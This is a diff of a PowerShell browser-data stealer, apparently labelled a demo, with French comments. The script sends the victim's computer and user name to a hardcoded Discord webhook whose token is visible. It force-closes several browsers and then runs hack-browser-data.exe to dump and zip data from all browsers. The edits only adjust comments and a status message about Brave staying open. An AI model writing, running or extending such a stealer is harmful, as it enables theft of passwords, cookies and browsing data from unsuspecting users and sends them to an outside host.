@@ -1,4 +1,4 @@
-# HackBrowserData Demo - Version DEBUG
+# HackBrowserData Demo - SANS fermer Brave
 $wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"
 
 function Send-Discord {
@@ -11,7 +11,7 @@ function Send-Discord {
 
 Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"
 
-# Tuer les navigateurs
+# Tuer SEULEMENT Chrome, Edge, Firefox (PAS Brave)
 @("chrome","msedge","firefox","opera","vivaldi") | ForEach-Object {
     Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
 }
@@ -67,9 +67,9 @@ try {
         exit
     }
     
-    Send-Discord "🔓 **Extracting browser data...**"
+    Send-Discord "🔓 **Extracting browser data (Brave still running)...**"
     
-    # Exécuter
+    # Exécuter - Brave restera ouvert mais les données pourraient être partielles
     Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
     
     Start-Sleep 3
